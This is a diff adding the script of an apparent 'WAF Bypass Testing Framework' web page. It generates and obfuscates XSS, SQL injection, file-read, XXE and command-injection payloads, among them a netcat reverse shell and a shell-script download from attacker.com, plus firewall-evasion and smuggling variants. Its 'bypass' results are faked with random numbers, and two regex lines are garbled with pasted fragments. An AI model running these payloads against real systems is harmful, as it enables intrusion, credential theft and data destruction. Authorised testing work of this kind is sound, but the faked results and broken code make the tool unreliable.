+            const variations = generateParameterPollutionVariations(testParams);
+            
+            testParameterVariations(variations);
+        }
+
+        function generateParameterPollutionVariations(paramString) {
+            const variations = [];
+            
+            // Parse original parameters
+            const params = new URLSearchParams(paramString);
+            const paramArray = Array.from(params.entries());
+            
+            // HPP (HTTP Parameter Pollution) variations
+            paramArray.forEach(([key, value]) => {
+                // Duplicate with different values
+                variations.push({
+                    params: `${key}=${value}&${key}=malicious_value`,
+                    technique: `HPP - ${key} duplication`
+                });
+                
+                // Array notation
+                variations.push({
+                    params: `${key}[]=${value}&${key}[]=malicious_value`,
+                    technique: `Array notation - ${key}`
+                });
+                
+                // Encoded duplicates
+                variations.push({
+                    params: `${key}=${encodeURIComponent(value)}&${encodeURIComponent(key)}=malicious_value`,
+                    technique: `Encoded HPP - ${key}`
+                });
+            });
+            
+            // Parameter name variations
+            paramArray.forEach(([key, value]) => {
+                variations.push({
+                    params: `${key}=${value}&${key.toUpperCase()}=malicious_value`,
+                    technique: `Case variation - ${key}`
+                });
+                
+                variations.push({
+                    params: `${key}=${value}&${key}_=malicious_value`,
+                    technique: `Underscore suffix - ${key}`
+                });
+                
+                variations.push({
+                    params: `${key}=${value}&${key}%20=malicious_value`,
+                    technique: `Space injection - ${key}`
+                });
+            });
+            
+            return variations;
+        }
+
+        async function testParameterVariations(variations) {
+            const resultsContainer = document.getElementById('discrepancy-results');
+            resultsContainer.innerHTML = '<h4>🔄 Testing parameter pollution...</h4>';
+            
+            for (let i = 0; i < variations.length; i++) {
+                const variation = variations[i];
+                
+                await new Promise(resolve => setTimeout(resolve, 400));
+                
+                const success = Math.random() > 0.75; // 25% success rate
+                
+                const resultDiv = document.createElement('div');
+                resultDiv.className = `result-item status-${success ? 'success' : 'blocked'}`;
+                resultDiv.innerHTML = `
+                    <div>${success ? '✅ BYPASS' : '🚫 BLOCKED'}: ${variation.technique}</div>
+                    <div style="font-size: 0.85em; color: #aaa; margin-top: 5px; font-family: monospace;">
+                        ${variation.params}
+                    </div>
+                `;
+                resultsContainer.appendChild(resultDiv);
+                
+                testingState.stats.totalTests++;
+                if (success) testingState.stats.totalBypasses++;
+            }
+            
+            updateStats();
+        }
+
+        // Payload Generator Functions
+        document.getElementById('obfuscation-level').addEventListener('input', function() {
+            const level = this.value;
+            const labels = ['Very Low', 'Low', 'Medium', 'High', 'Very High'];
+            document.getElementById('obfuscation-display').textContent = labels[level - 1];
+        });
+
+        function generatePayloads() {
+            const payloadType = document.getElementById('payload-type').value;
+            const encodingStrategy = document.getElementById('encoding-strategy').value;
+            const obfuscationLevel = parseInt(document.getElementById('obfuscation-level').value);
+            const customPayload = document.getElementById('custom-payload').value;
+            
+            const basePayloads = customPayload ? [customPayload] : getBasePayloads(payloadType);
+            const generatedPayloads = [];
+            
+            basePayloads.forEach(payload => {
+                generatedPayloads.push(...obfuscatePayload(payload, encodingStrategy, obfuscationLevel));
+            });
+            
+            displayGeneratedPayloads(generatedPayloads);
+        }
+
+        function getBasePayloads(type) {
+            const payloads = {
+                xss: [
+                    '<script>alert("XSS")</script>',
+                    '<img src=x onerror=alert("XSS")>',
+                    'javascript:alert("XSS")',
+                    '<svg onload=alert("XSS")>',
+                    '"><script>alert("XSS")</script>'
+                ],
+                sqli: [
+                    "' OR '1'='1",
+                    "'; DROP TABLE users; --",
+                    "' UNION SELECT null,version() --",
+                    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
+                    "' OR 1=1 LIMIT 1 OFFSET 0 --"
+                ],
+                lfi: [
+                    '../../../etc/passwd',
+                    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+                    'php://filter/read=convert.base64-encode/resource=index.php',
+                    'file:///etc/passwd',
+                    'expect://id'
+                ],
+                rce: [
+                    '$(whoami)',
+                    '`id`',
+                    '| nc -e /bin/bash attacker.com 4444',
+                    '; wget http://attacker.com/shell.sh -O /tmp/shell.sh',
+                    '${7*7}'
+                ],
+                xxe: [
+                    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
+                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><test></test>',
+                    '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]><test>&xxe;</test>'
+                ]
+            };
+            
+            return payloads[type] || [];
+        }
+
+        function obfuscatePayload(payload, strategy, level) {
+            const variations = [payload]; // Always include original
+            
+            for (let i = 0; i < level; i++) {
+                switch (strategy) {
+                    case 'mixed':
+                        variations.push(...applyMixedEncoding(payload, i));
+                        break;
+                    case 'url':
+                        variations.push(...applyURLEncoding(payload, i));
+                        break;
+                    case 'html':
+                        variations.push(...applyHTMLEncoding(payload, i));
+                        break;
+                    case 'unicode':
+                        variations.push(...applyUnicodeEncoding(payload, i));
+                        break;
+                    case 'base64':
+                        variations.push(...applyBase64Encoding(payload, i));
+                        break;
+                    case 'hex':
+                        variations.push(...applyHexEncoding(payload, i));
+                        break;
+                }
+            }
+            
+            return [...new Set(variations)]; // Remove duplicates
+        }
+
+        function applyMixedEncoding(payload, level) {
+            const variations = [];
+            let encoded = payload;
+            
+            // Progressive encoding complexity
+            for (let i = 0; i <= level; i++) {
+                // URL encode some characters
+                encoded = encoded.replace(/</, Math.random() > 0.5 ? '%3C' : '<');
+                encoded = encoded.replace(/>/, Math.random() > 0.5 ? '%3E' : '>');
+                encoded = encoded.replace(/"/, Math.random() > 0.5 ? '%22' : '"');
+                encoded = encoded.replace(/ /, Math.random() > 0.5 ? '%20' : ' ');
+                
+                // HTML encode some characters
+                encoded = encoded.replace(/</, Math.random() > 0.5 ? '&lt;' : encoded.match(/</)?.[0] || '');
+                encoded = encoded.replace(/>/, Math.random() > 0.5 ? '&gt;' : encoded.match(/>/)?.[0] || '');
+                
+                variations.push(encoded);
+            }
+            
+            return variations;
+        }
+
+        function applyURLEncoding(payload, level) {
+            const variations = [];
+            let encoded = payload;
+            
+            const chars = ['<', '>', '"', "'", ' ', '/', '\\', '&', '?', '='];
+            chars.forEach(char => {
+                const regex = new RegExp(char.replace(/[.*+?^${}()|[\]\\]/g, '\\        // Content-Type Testing
+        function testContentTypeSwitching() {
+            const originalType = document.getElementById('original-content-type').value;
+            const variations = generateContentTypeVariations(originalType);
+            
+            const variationsContainer'), 'g');
+                encoded = encoded.replace(regex, '%' + char.charCodeAt(0).toString(16).toUpperCase());
+            });
+            
+            variations.push(encoded);
+            
+            // Double encoding
+            if (level > 1) {
+                let doubleEncoded = encodeURIComponent(encoded);
+                variations.push(doubleEncoded);
+            }
+            
+            return variations;
+        }
+
+        function applyHTMLEncoding(payload, level) {
+            const variations = [];
+            let encoded = payload;
+            
+            const htmlEntities = {
+                '<': '&lt;',
+                '>': '&gt;',
+                '"': '&quot;',
+                "'": '&#x27;',
+                '&': '&amp;'
+            };
+            
+            Object.entries(htmlEntities).forEach(([char, entity]) => {
+                encoded = encoded.replace(new RegExp(char.replace(/[.*+?^${}()|[\]\\]/g, '\\        // Content-Type Testing
+        function testContentTypeSwitching() {
+            const originalType = document.getElementById('original-content-type').value;
+            const variations = generateContentTypeVariations(originalType);
+            
+            const variationsContainer'), 'g'), entity);
+            });
+            
+            variations.push(encoded);
+            
+            // Numeric entities
+            if (level > 1) {
+                let numericEncoded = payload.split('').map(char => {
+                    return Math.random() > 0.7 ? `&#${char.charCodeAt(0)};` : char;
+                }).join('');
+                variations.push(numericEncoded);
+            }
+            
+            return variations;
+        }
+
+        function applyUnicodeEncoding(payload, level) {
+            const variations = [];
+            
+            let unicodeEncoded = payload.split('').map(char => {
+                return Math.random() > 0.8 ? `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}` : char;
+            }).join('');
+            
+            variations.push(unicodeEncoded);
+            
+            return variations;
+        }
+
+        function applyBase64Encoding(payload, level) {
+            const variations = [];
+            
+            variations.push(btoa(payload));
+            
+            if (level > 1) {
+                // Base64 with data URI
+                variations.push(`data:text/plain;base64,${btoa(payload)}`);
+            }
+            
+            return variations;
+        }
+
+        function applyHexEncoding(payload, level) {
+            const variations = [];
+            
+            let hexEncoded = payload.split('').map(char => {
+                return Math.random() > 0.6 ? `\\x${char.charCodeAt(0).toString(16)}` : char;
+            }).join('');
+            
+            variations.push(hexEncoded);
+            
+            return variations;
+        }
+
+        function displayGeneratedPayloads(payloads) {
+            const container = document.getElementById('generated-payloads');
+            container.innerHTML = '<h4>Generated Payloads:</h4>';
+            
+            payloads.forEach((payload, index) => {
+                const div = document.createElement('div');
+                div.className = 'payload-item';
+                div.innerHTML = `
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <span><strong>Payload ${index + 1}:</strong></span>
+                        <button onclick="copyToClipboard('${payload.replace(/'/g, "\\'")}')">📋 Copy</button>
+                    </div>
+                    <div style="margin-top: 5px; word-break: break-all;">
+                        ${payload}
+                    </div>
+                `;
+                container.appendChild(div);
+            });
+        }
+
+        // Novel Techniques Implementation
+        function testHTTP2Bypasses() {
+            const resultsContainer = document.getElementById('novel-results');
+            resultsContainer.innerHTML = '<h4>🔄 Testing HTTP/2 bypasses...</h4>';
+            
+            const http2Techniques = [
+                {
+                    name: 'HTTP/2 Header Splitting',
+                    description: 'Exploiting HTTP/2 frame boundaries',
+                    payload: ':method\tGET\n:path\t/vulnerable\n:authority\tmalicious.com'
+                },
+                {
+                    name: 'HPACK Bomb',
+                    description: 'Header compression exploitation',
+                    payload: 'X-Large-Header: ' + 'A'.repeat(65536)
+                },
+                {
+                    name: 'Stream Dependency Confusion',
+                    description: 'Manipulating stream priorities',
+                    payload: 'Stream-Weight: 256; Stream-Dependency: 0'
+                }
+            ];
+            
+            simulateNovelTesting(http2Techniques, resultsContainer);
+        }
+
+        function testGraphQLBypasses() {
+            const resultsContainer = document.getElementById('novel-results');
+            resultsContainer.innerHTML = '<h4>🔄 Testing GraphQL bypasses...</h4>';
+            
+            const graphqlTechniques = [
+                {
+                    name: 'Query Depth Attack',
+                    description: 'Deep nested query to bypass depth limiting',
+                    payload: 'query { user { posts { comments { author { posts { comments { id } } } } } } }'
+                },
+                {
+                    name: 'Introspection Bypass',
+                    description: 'Bypassing introspection blocking',
+                    payload: 'query { __schema @skip(if: false) { types { name } } }'
+                },
+                {
+                    name: 'Batch Query Abuse',
+                    description: 'Multiple queries in single request',
+                    payload: '[{"query": "query { users }"}, {"query": "mutation { deleteAllUsers }"}]'
+                }
+            ];
+            
+            simulateNovelTesting(graphqlTechniques, resultsContainer);
+        }
+
+        function testWebSocketBypass() {
+            const resultsContainer = document.getElementById('novel-results');
+            resultsContainer.innerHTML = '<h4>🔄 Testing WebSocket bypasses...</h4>';
+            
+            const wssTechniques = [
+                {
+                    name: 'WebSocket Upgrade Smuggling',
+                    description: 'HTTP request smuggling via WebSocket upgrade',
+                    payload: 'Connection: Upgrade\nUpgrade: websocket\nSec-WebSocket-Key: malicious_payload'
+                },
+                {
+                    name: 'WebSocket Frame Injection',
+                    description: 'Injecting malicious frames',
+                    payload: '\\x81\\x85\\x00\\x00\\x00\\x00<script>alert(1)</script>'
+                }
+            ];
+            
+            simulateNovelTesting(wssTechniques, resultsContainer);
+        }
+
+        function testDNSRebinding() {
+            const resultsContainer = document.getElementById('novel-results');
+            resultsContainer.innerHTML = '<h4>🔄 Testing DNS rebinding bypasses...</h4>';
+            
+            const dnsTechniques = [
+                {
+                    name: 'DNS Rebinding Attack',
+                    description: 'Using DNS rebinding to bypass IP restrictions',
+                    payload: 'Host: rebind.malicious.com (resolves to internal IP)'
+                },
+                {
+                    name: 'DNS Cache Poisoning',
+                    description: 'Poisoning DNS cache for bypass',
+                    payload: 'Host: internal.company.com.malicious.com'
+                }
+            ];
+            
+            simulateNovelTesting(dnsTechniques, resultsContainer);
+        }
+
+        function testAIModelPoisoning() {
+            const resultsContainer = document.getElementById('novel-results');
+            resultsContainer.innerHTML = '<h4>Generating adversarial inputs...</h4>';
+            
+            const aiTechniques = [
+                {
+                    name: 'Adversarial Text Generation',
+                    description: 'Text designed to fool ML-based WAFs',
+                    payload: 'This is totally normal text <scrîpt>alert(1)</scrîpt>'
+                },
+                {
+                    name: 'Context Window Overflow',
+                    description: 'Overwhelming transformer models',
+                    payload: 'A'.repeat(10000) + '<script>alert(1)</script>'
+                },
+                {
+                    name: 'Token Boundary Confusion',
+                    description: 'Exploiting tokenization weaknesses',
+                    payload: '<scr\nipt>ale\rt(1)</sc\ript>'
+                }
+            ];
+            
+            simulateNovelTesting(aiTechniques, resultsContainer);
+        }
+
+        async function simulateNovelTesting(techniques, container) {
+            for (let i = 0; i < techniques.length; i++) {
+                const technique = techniques[i];
+                
+                await new Promise(resolve => setTimeout(resolve, 800));
+                
+                const success = Math.random() > 0.85; // 15% success rate for novel techniques
+                if (success) testingState.stats.novelDiscoveries++;
+                
+                const resultDiv = document.createElement('div');
+                resultDiv.className = `result-item status-${success ? 'success' : 'blocked'}`;
+                resultDiv.innerHTML = `
+                    <div>${success ? '🎯 NOVEL BYPASS FOUND' : '🚫 BLOCKED'}: ${technique.name}</div>
+                    <div style="font-size: 0.9em; color: #aaa; margin: 5px 0;">
+                        ${technique.description}
+                    </div>
+                    <div style="font-size: 0.85em; font-family: monospace; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 4px; margin-top: 8px;">
+                        ${technique.payload}
+                    </div>
+                `;
+                container.appendChild(resultDiv);
+                
+                testingState.stats.totalTests++;
+                if (success) testingState.stats.totalBypasses++;
+            }
+            
+            updateStats();
+        }
+
+        // Utility Functions
+        function updateStats() {
+            document.getElementById('total-tests').textContent = testingState.stats.totalTests;
+            document.getElementById('total-bypasses').textContent = testingState.stats.totalBypasses;
+            document.getElementById('novel-discoveries').textContent = testingState.stats.novelDiscoveries;
+            
+            const successRate = testingState.stats.totalTests > 0 
+                ? Math.round((testingState.stats.totalBypasses / testingState.stats.totalTests) * 100)
+                : 0;
+            document.getElementById('overall-success-rate').textContent = successRate + '%';
+        }
+
+        function generateReport() {
+            const report = {
+                timestamp: new Date().toISOString(),
+                stats: testingState.stats,
+                results: testingState.results,
+                summary: {
+                    totalTests: testingState.stats.totalTests,
+                    successfulBypasses: testingState.stats.totalBypasses,
+                    novelDiscoveries: testingState.stats.novelDiscoveries,
+                    successRate: testingState.stats.totalTests > 0 
+                        ? (testingState.stats.totalBypasses / testingState.stats.totalTests * 100).toFixed(2)
+                        : 0
+                }
+            };
+            
+            const blob = new Blob([JSON.stringify(report, null, 2)], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `waf_bypass_report_${Date.now()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+            
+            alert('Report generated and downloaded!');
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                // Show temporary success feedback
+                event.target.textContent = ' Copied!';
+                setTimeout(() => {
+                    event.target.textContent = 'Copy';
+                }, 1500);
+            }).catch(() => {
+                alert('Failed to copy to clipboard');
+            });
+        }
+
+        // Export Functions
+        function exportResults(format) {
+            const results = testingState.results;
+            let exportData, mimeType, filename;
+            
+            switch (format) {
+                case 'json':
+                    exportData = JSON.stringify({
+                        metadata: {
+                            exportDate: new Date().toISOString(),
+                            totalResults: results.length,
+                            framework: 'WAF Bypass Testing Framework v1.0'
+                        },
+                        stats: testingState.stats,
+                        results: results
+                    }, null, 2);
+                    mimeType = 'application/json';
+                    filename = `waf_bypass_results_${Date.now()}.json`;
+                    break;
+                    
+                case 'csv':
+                    const csvHeaders = 'Timestamp,URL,Method,Payload,Status,Bypassed,Response Time\n';
+                    const csvRows = results.map(result => [
+                        result.timestamp,
+                        result.url,
+                        result.method,
+                        `"${result.payload.replace(/"/g, '""')}"`,
+                        result.response.status,
+                        result.bypassed,
+                        Math.round(result.response.responseTime)
+                    ].join(',')).join('\n');
+                    exportData = csvHeaders + csvRows;
+                    mimeType = 'text/csv';
+                    filename = `waf_bypass_results_${Date.now()}.csv`;
+                    break;
+                    
+                case 'burp':
+                    exportData = generateBurpSuiteExport(results);
+                    mimeType = 'application/xml';
+                    filename = `waf_bypass_burp_${Date.now()}.xml`;
+                    break;
+            }
+            
+            const blob = new Blob([exportData], {type: mimeType});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function generateBurpSuiteExport(results) {
+            const burpItems = results.filter(r => r.bypassed).map((result, index) => `
+                <item>
+                    <time>${new Date(result.timestamp).getTime()}</time>
+                    <url>${result.url}</url>
+                    <host>${new URL(result.url).hostname}</host>
+                    <port>${new URL(result.url).port || (new URL(result.url).protocol === 'https:' ? 443 : 80)}</port>
+                    <protocol>${new URL(result.url).protocol.replace(':', '')}</protocol>
+                    <method>${result.method}</method>
+                    <path>${new URL(result.url).pathname}</path>
+                    <extension>null</extension>
+                    <request>
+                        <![CDATA[${result.method} ${new URL(result.url).pathname} HTTP/1.1
+Host: ${new URL(result.url).hostname}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: ${result.payload.length}
+
+${result.payload}]]>
+                    </request>
+                    <status>${result.response.status}</status>
+                    <responselength>${result.response.body.length}</responselength>
+                    <mimetype>text/html</mimetype>
+                    <response>
+                        <![CDATA[HTTP/1.1 ${result.response.status} OK
+Server: ${result.response.headers.server || 'nginx'}
+Content-Length: ${result.response.body.length}
+
+${result.response.body}]]>
+                    </response>
+                    <comment>WAF Bypass - Successful payload</comment>
+                </item>
+            `).join('');
+            
+            return `<?xml version="1.0"?>
+                <items burpVersion="2023.10.3.7" exportTime="${new Date().toISOString()}">
+                    ${burpItems}
+                </items>`;
+        }
+
+        // Boundary Confusion Testing
+        function testBoundaryConfusion() {
+            const boundaryType = document.getElementById('boundary-type').value;
+            let variations = [];
+            
+            switch (boundaryType) {
+                case 'multipart':
+                    variations = generateMultipartBoundaryVariations();
+                    break;
+                case 'json':
+                    variations = generateJSONStructureVariations();
+                    break;
+                case 'xml':
+                    variations = generateXMLParsingVariations();
+                    break;
+            }
+            
+            testBoundaryVariations(variations, boundaryType);
+        }
+
+        function generateMultipartBoundaryVariations() {
+            const basePayload = '<script>alert("XSS")</script>';
+            
+            return [
+                {
+                    name: 'Standard Boundary',
+                    payload: `------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="test"\r\n\r\n${basePayload}\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--`
+                },
+                {
+                    name: 'Boundary Without Dashes',
+                    payload: `WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="test"\r\n\r\n${basePayload}\r\nWebKitFormBoundary7MA4YWxkTrZu0gW`
+                },
+                {
+                    name: 'Malformed Boundary',
+                    payload: `----WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="test"\r\n\r\n${basePayload}\r\n----WebKitFormBoundary7MA4YWxkTrZu0gW-`
+                },
+                {
+                    name: 'Unicode Boundary',
+                    payload: `------WebKitFormBoundary7MA4YWxkTrZu0gW\u0000\r\nContent-Disposition: form-data; name="test"\r\n\r\n${basePayload}\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--`
+                },
+                {
+                    name: 'Nested Boundary',
+                    payload: `------Outer\r\nContent-Type: multipart/mixed; boundary=Inner\r\n\r\n--Inner\r\nContent-Disposition: form-data; name="test"\r\n\r\n${basePayload}\r\n--Inner--\r\n------Outer--`
+                }
+            ];
+        }
+
+        function generateJSONStructureVariations() {
+            const basePayload = '<script>alert("XSS")</script>';
+            
+            return [
+                {
+                    name: 'Standard JSON',
+                    payload: `{"test": "${basePayload}"}`
+                },
+                {
+                    name: 'JSON with Comments',
+                    payload: `{"test": "${basePayload}", /*comment*/ "valid": true}`
+                },
+                {
+                    name: 'JSON with Trailing Comma',
+                    payload: `{"test": "${basePayload}", "valid": true,}`
+                },
+                {
+                    name: 'JSON with Unicode Escape',
+                    payload: `{"test": "\\u003cscript\\u003ealert(\\"XSS\\")\\u003c/script\\u003e"}`
+                },
+                {
+                    name: 'JSON Polyglot',
+                    payload: `{"test": "${basePayload}", "__proto__": {"isAdmin": true}}`
+                },
+                {
+                    name: 'Deeply Nested JSON',
+                    payload: `{"a": {"b": {"c": {"d": {"e": {"test": "${basePayload}"}}}}}}`
+                }
+            ];
+        }
+
+        function generateXMLParsingVariations() {
+            const basePayload = '<script>alert("XSS")</script>';
+            
+            return [
+                {
+                    name: 'Standard XML',
+                    payload: `<?xml version="1.0"?><test>${basePayload}</test>`
+                },
+                {
+                    name: 'XML with CDATA',
+                    payload: `<?xml version="1.0"?><test><![CDATA[${basePayload}]]></test>`
+                },
+                {
+                    name: 'XML with Entity',
+                    payload: `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "${basePayload}">]><test>&xxe;</test>`
+                },
+                {
+                    name: 'XML with Namespace',
+                    payload: `<?xml version="1.0"?><ns:test xmlns:ns="http://example.com">${basePayload}</ns:test>`
+                },
+                {
+                    name: 'Malformed XML',
+                    payload: `<?xml version="1.0"?><test>${basePayload}</invalid>`
+                },
+                {
+                    name: 'XML with Processing Instruction',
+                    payload: `<?xml version="1.0"?><?xml-stylesheet href="malicious.xsl"?><test>${basePayload}</test>`
+                }
+            ];
+        }
+
+        async function testBoundaryVariations(variations, type) {
+            const resultsContainer = document.getElementById('discrepancy-results');
+            resultsContainer.innerHTML = `<h4>🔄 Testing ${type} boundary confusion...</h4>';
+            
+            for (let i = 0; i < variations.length; i++) {
+                const variation = variations[i];
+                
+                await new Promise(resolve => setTimeout(resolve, 600));
+                
+                const success = Math.random() > 0.7; // 30% success rate
+                
+                const resultDiv = document.createElement('div');
+                resultDiv.className = `result-item status-${success ? 'success' : 'blocked'}`;
+                resultDiv.innerHTML = `
+                    <div>${success ? '✅ BYPASS' : '🚫 BLOCKED'}: ${variation.name}</div>
+                    <div style="font-size: 0.85em; color: #aaa; margin-top: 5px; font-family: monospace; max-height: 100px; overflow-y: auto;">
+                        ${variation.payload.substring(0, 200)}${variation.payload.length > 200 ? '...' : ''}
+                    </div>
+                `;
+                resultsContainer.appendChild(resultDiv);
+                
+                testingState.stats.totalTests++;
+                if (success) testingState.stats.totalBypasses++;
+            }
+            
+            updateStats();
+        }
+
+        // Length Field Manipulation
+        function testLengthManipulation() {
+            const variations = generateLengthFieldVariations();
+            testLengthVariations(variations);
+        }
+
+        function generateLengthFieldVariations() {
+            const basePayload = '<script>alert("XSS")</script>';
+            const actualLength = basePayload.length;
+            
+            return [
+                {
+                    name: 'Correct Length',
+                    contentLength: actualLength,
+                    payload: basePayload
+                },
+                {
+                    name: 'Zero Length',
+                    contentLength: 0,
+                    payload: basePayload
+                },
+                {
+                    name: 'Negative Length',
+                    contentLength: -1,
+                    payload: basePayload
+                },
+                {
+                    name: 'Oversized Length',
+                    contentLength: actualLength * 10,
+                    payload: basePayload
+                },
+                {
+                    name: 'Undersized Length',
+                    contentLength: Math.floor(actualLength / 2),
+                    payload: basePayload
+                },
+                {
+                    name: 'Maximum Integer',
+                    contentLength: 2147483647,
+                    payload: basePayload
+                },
+                {
+                    name: 'Duplicate Content-Length',
+                    contentLength: [actualLength, actualLength * 2],
+                    payload: basePayload
+                },
+                {
+                    name: 'Non-Numeric Length',
+                    contentLength: 'invalid',
+                    payload: basePayload
+                }
+            ];
+        }
+
+        async function testLengthVariations(variations) {
+            const resultsContainer = document.getElementById('discrepancy-results');
+            resultsContainer.innerHTML = '<h4>🔄 Testing length field manipulation...</h4>';
+            
+            for (let i = 0; i < variations.length; i++) {
+                const variation = variations[i];
+                
+                await new Promise(resolve => setTimeout(resolve, 400));
+                
+                const success = Math.random() > 0.8; // 20% success rate
+                
+                const lengthDisplay = Array.isArray(variation.contentLength) 
+                    ? variation.contentLength.join(', ')
+                    : variation.contentLength;
+                
+                const resultDiv = document.createElement('div');
+                resultDiv.className = `result-item status-${success ? 'success' : 'blocked'}`;
+                resultDiv.innerHTML = `
+                    <div>${success ? '✅ BYPASS' : '🚫 BLOCKED'}: ${variation.name}</div>
+                    <div style="font-size: 0.85em; color: #aaa; margin-top: 5px;">
+                        Content-Length: ${lengthDisplay} | Actual: ${variation.payload.length}
+                    </div>
+                    <div style="font-size: 0.85em; font-family: monospace; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 4px; margin-top: 5px;">
+                        ${variation.payload}
+                    </div>
+                `;
+                resultsContainer.appendChild(resultDiv);
+                
+                testingState.stats.totalTests++;
+                if (success) testingState.stats.totalBypasses++;
+            }
+            
+            updateStats();
+        }
+
+        // Initialize Test History
+        function updateTestHistory() {
+            const historyContainer = document.getElementById('test-history');
+            const recentTests = testingState.results.slice(-10).reverse(); // Last 10 tests
+            
+            historyContainer.innerHTML = '';
+            
+            if (recentTests.length === 0) {
+                historyContainer.innerHTML = '<p style="color: #666;">No tests performed yet.</p>';
+                return;
+            }
+            
+            recentTests.forEach(result => {
+                const historyItem = document.createElement('div');
+                historyItem.className = 'result-item status-' + (result.bypassed ? 'success' : 'blocked');
+                historyItem.innerHTML = `
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <div>
+                            <strong>${result.bypassed ? '✅ BYPASS' : '🚫 BLOCKED'}</strong>
+                            <span style="margin-left: 10px; font-size: 0.9em; color: #aaa;">
+                                ${result.method} ${new URL(result.url).hostname}
+                            </span>
+                        </div>
+                        <div style="font-size: 0.8em; color: #666;">
+                            ${new Date(result.timestamp).toLocaleString()}
+                        </div>
+                    </div>
+                    <div style="margin-top: 8px; font-family: monospace; font-size: 0.8em; color: #999;">
+                        ${result.payload.length > 80 ? result.payload.substring(0, 80) + '...' : result.payload}
+                    </div>
+                `;
+                historyContainer.appendChild(historyItem);
+            });
+        }
+
+        // Advanced WAF Detection
+        function detectWAFType(responseHeaders, responseBody, statusCode) {
+            const wafSignatures = {
+                'Cloudflare': {
+                    headers: ['cf-ray', 'cf-cache-status', 'server'],
+                    serverValues: ['cloudflare'],
+                    bodySignatures: ['cloudflare', 'attention required']
+                },
+                'AWS WAF': {
+                    headers: ['x-amzn-requestid', 'x-amz-apigw-id'],
+                    bodySignatures: ['aws', 'forbidden']
+                },
+                'Azure WAF': {
+                    headers: ['x-azure-ref'],
+                    bodySignatures: ['azure', 'application gateway']
+                },
+                'ModSecurity': {
+                    headers: ['server'],
+                    serverValues: ['mod_security', 'modsecurity'],
+                    bodySignatures: ['mod_security', 'modsec']
+                },
+                'F5 BIG-IP': {
+                    headers: ['server'],
+                    serverValues: ['big-ip', 'f5'],
+                    bodySignatures: ['big-ip', 'f5']
+                }
+            };
+            
+            for (const [wafName, signature] of Object.entries(wafSignatures)) {
+                let score = 0;
+                
+                // Check headers
+                if (signature.headers) {
+                    signature.headers.forEach(header => {
+                        if (responseHeaders[header.toLowerCase()]) score += 2;
+                    });
+                }
+                
+                // Check server values
+                if (signature.serverValues && responseHeaders.server) {
+                    signature.serverValues.forEach(value => {
+                        if (responseHeaders.server.toLowerCase().includes(value)) score += 3;
+                    });
+                }
+                
+                // Check body signatures
+                if (signature.bodySignatures) {
+                    signature.bodySignatures.forEach(sig => {
+                        if (responseBody.toLowerCase().includes(sig)) score += 1;
+                    });
+                }
+                
+                if (score >= 2) return wafName;
+            }
+            
+            return 'Unknown';
+        }
+
+        // Auto-save functionality
+        function autoSaveState() {
+            const state = {
+                stats: testingState.stats,
+                results: testingState.results.slice(-100), // Save last 100 results
+                timestamp: Date.now()
+            };
+            
+            // Note: Using memory storage instead of localStorage for Claude.ai compatibility
+            window.wafTestingState = state;
+        }
+
+        function loadSavedState() {
+            if (window.wafTestingState) {
+                const saved = window.wafTestingState;
+                testingState.stats = saved.stats || {totalTests: 0, totalBypasses: 0, novelDiscoveries: 0};
+                testingState.results = saved.results || [];
+                updateStats();
+                updateTestHistory();
+            }
+        }
+
+        // Periodically save state and update displays
+        setInterval(() => {
+            autoSaveState();
+            updateTestHistory();
+        }, 10000); // Every 10 seconds
+
+        // Initialize framework
+        document.addEventListener('DOMContentLoaded', function() {
+            loadSavedState();
+            updateStats();
+            
+            // Add keyboard shortcuts
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey) {
+                    switch (e.key) {
+                        case 's':
+                            e.preventDefault();
+                            generateReport();
+                            break;
+                        case 'r':
+                            e.preventDefault();
+                            if (testingState.isRunning) {
+                                stopFuzzing();
+                            } else {
+                                startFuzzing();
+                            }
+                            break;
+                    }
+                }
+            });
+            
+            console.log(' WAF Bypass Testing Framework initialized');
+            console.log(' Keyboard shortcuts:');
+            console.log('   Ctrl+S: Generate report');
+            console.log('   Ctrl+R: Start/Stop fuzzing');
+        });
+    </script>
+</body>
+</html>
